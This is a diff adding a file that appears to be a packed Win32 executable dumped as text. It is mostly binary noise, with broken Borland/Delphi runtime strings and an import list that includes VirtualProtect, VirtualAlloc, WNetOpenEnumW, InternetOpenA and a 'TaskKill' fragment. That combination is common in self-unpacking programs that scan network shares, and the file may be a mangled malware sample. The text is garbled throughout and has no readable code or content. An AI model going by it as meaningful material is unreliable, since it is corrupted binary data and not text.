@@ -1,0 +1,353 @@
+This program must be run under Win32
+qywx87yf8x7y8xfy7xy87wy x7y8q7
+ardinal
+str2gX
+TObject
+erfacep
+MM Borland E&tion 
+ 2004,
+rofess)S S
+twa Developme
+,[" ((%
+.0881[,
+R/28@@
+Qr!DoDKG
+ut,Z(aj.i
+/.FB!VX
+Kkt~gwT[
+GxK/qnl
+o`h8uc
+C0Mx~z1
+ unexpLed memory
+ak has occu
+The,small bl$k
+Fs:3Unknown
+Csize[fL
+diumHn
+Mge^YO^fN&sS
+k0RVsc
+cBDwtZ
+,$YXZ[
+ePdlIb
++t_$xtZXtU0
+~KxI[)
+3l5yE8
+FPUMaskValuO
+o;RQSU|
+ |v).w 
+ZTUWVS
+D0Wf/D!
+B<8<8E
+8ds|AKP
+.c/-Rf;0n
+{+|p_9
+N|*f}&P~
+tOuCh6
+$^0['r
+|xhDBNP[~
+7uAJt
+J4znd*
+NBq[d{
+r&BE(Z
+nel32.dll
+GetLongPathNameA`8Gx
+}cQcale 
+q 438q
+eam|o 
+TCustom
+@=SA@7
+*4}Ot%
+-tWH6jw
+ExcepY
+In]Err[
+EDivByB
+/verflow
+"{e$~W$~
+Bck`k|W+
+f8[$^(9
+>$TMulR
+p"8k +Q
+'/t!)J
+D<*%0r=<9w9
+[<E*"c[>
+INFNAN
+umQKpj
+%gu4 \
+$@-Z;3Y
+Pv FW;]
+_^7a\7
+Kh#hh#
+TUnitH
+ashArray
+oduleInfo
+DiskFreeA
+Sp`ExA>
+#8vk5E
+}M(H;r
+;G$t@l
+dhlp9j
+Search
+9,]=E
+C teToolhk
+ 32SnapshotH
+2dWW[%K
+Qkkbal
+-Po<s Co
+right (c) 19
+ddmann
+Pd0@NR
+_l"&:X
+;,&H):
+Bj/g2B
+Wry**1
+Vlx-;}
+Os"6,Xg
+RwOy|v
+m=:(5c
+'5t/s
+.mCw:W
+J(WtpT
+SB~qh+
+$Gr $ 
+s)H:[o
+TDigits~
+Y aUq#
+jvDHtK]
+"`u9 e0Y
+SrVdEC`2(CF
++;X Za
++,CO` 
+lr7Wr
+V/5g$/
+f@w0J
+0Qbds]
+d$!jo@
+TZeppelin
+kRV,;$A
+22`HDD
+otAddSubsG
+yMulDivId
+/XorCmp4FromSt
+yBool
+dex+tcb
+#t?Htb
+kw>xQ"
+#(&'$[
+2B&{b,
+4c0X6"1
+Doub`S
+}CCsncC0
+(W0NDq
+Any'#'|
+ErlrW 
+IpsAdazo
+,<A8$7
+ZE00d
+7<TQ2(
+#=#[;]
+h[U2}$Q
+kodafq
+a](@h%|
+XrBb5$
+D"f=Uw
+Tx';((
+dt7B%77
+{12B%U_
+787\$U
+L%h(RrvX
+?0123456789abcdefghijklmnop
+qTuvwxyzABCDEF^
+GHIJKLMNO
+^$.[()|?+*\{]}w
+\Nrrvc"jq
+comp): 
+oSBig'$Pa
+)Many )
+{s/%Unm
+Junk On End)
+ 8B[H%
+ZK-x_,-a[
+Foxows
+Ras?@Fp
+"- .movf'.
+C)Bracmm
+Iei5dSe
+u;3,Q.X",ri
+4Wi"os
+*JO4T.
+%/rRsSgGd
+K@{-V,
+#u0/Y&
+X<cc'+
+e<?MSE
+ (pos yFQ
+@:pxFFF
+(J_s|i
+D/IDg[
+Vrd@%*
+d<U~(z
+Id<dhM
+)Y,Y[Q
+TaskKill
+QuI)Fr
+^Q2>'P
+MO{:;6
+2,B<yXE
+2@":Ck
+(8Xlu+Z
+;};`mg)
+N:zu"#
+(boXKsr
+8gg''9:
+S~Sstp
+LOCALPUB
+}RIVF
+gtL't`
+Z/uOhaav
+4f[Xvn
+x&S/?u
+[oQg{"
+'W+4O
+=&;:;<=
+ !"#$%&'()*+,-./
+L&&jl66Z~??A
+Oh44\Q
+uB!!c 
+D""fT**~;
+;d22Vt::N
+$0D^3M
+C3tv+lvi
+ (9icT
+VirtuGFr
+formdce
+DkedDec
+WidZharTo
+Libr yExA
+!PrJAddress
+=lPath
+g9\X3L
+fX:nVC
+;Ma4+0he
+9WC88h
+FnslE)|Y
+Msg,F(XQ
+pS/a!;s[u
+pS]Yqu}J
+O@'e!s
+'*$Bsr&V2
+XPTPSW
+KERNEL32.DLL
+advapi32.dll
+mpr.dll
+oleaut32.dll
+shell32.dll
+user32.dll
+wininet.dll
+LoadLibraryA
+GetProcAddress
+VirtualProtect
+VirtualAlloc
+VirtualFree
+ExitProcess
+RegCloseKey
+WNetOpenEnumW
+VariantCopy
+SHGetMalloc
+CharNextA
+InternetOpenA
+F.i1m5
+',=k(.@
+-6KC+5K
+5?Tq5AW
+(.@k(/B
+(,>)(.?
+&+;-',=
+&+;#',=C(.?
+,3F{)1E
+(0C3/7K
+19Lw)1F
+)1F+,5I
+-6K?.7M
+3=Ry4?U
+7AWMCNc
+(.A[(/A
+'-@i(.A
+(.A[)/B
+(,>['-?
+',=/(,=
+(+<O',>
+'+:''+<
+'*:/'+<G',>o'-?
+(.AY(/B
+)0DU2:N
+(0D/3<O
+/7JE-5I
+,4IG-6K
+(1F;2<Q
+/9Nu8BW
+1<QoALa
+(3J)>I_
+(/BU(0D
+(.@+(.A
+(.?I(.@
+(.?#(.@I(.A
+(.?5(.@
+(->q(,>
+(,=G',>
+'*:9&,<O(,=o',>
+(.@i).A
+(.A?)0C
+)1Dw5>Q
+'.BQ7?R
+*2F+8AS
+'/CM2:N
+)0F)08L
+)0EU/9M
+)2G34>R
+(2Gk=H\
+)2HyBMa
+)3JK;F\
+)3K[7BY
+)8Se6D^
+20Oe%0@
++0Ga'/@
+'/AC(.A
+(.?'-A
+(.@)(.?_'-Am)/@
+'/@+).B
+'/@+).B
+(.@3(.?
+(->%(->
+&-==&-?i(,>y(.@
+&,=U(+<
+'*:q',;
+'+:a'*:
+&,?](.>
+'/A).B
+(1B(/B
+)1D728K
+*2FiISd
++2FEJSd
+*2EwDN`
+*2EM@J]
+(0E{:BT
+*2F;;CU
+)1Ew7?S
+*2G!,4H
+*3GU-5J
+)2Gm,5I
+*3HK(0F
+*3IA'1F
++4Jm'0F
+,6Ki'1G
+0:O9(2I
+4?V%4?Vm)5M
+6C\O7D]
+7yre78 c7ertc8 rte 7cr7
+ggggggggggggggggggggggggggggggg
+ggggggggggggggggggggggggggggggg
+ggggggggggggggggg
+gggggg
+gggggg
+gggggggg
+ggggggggg
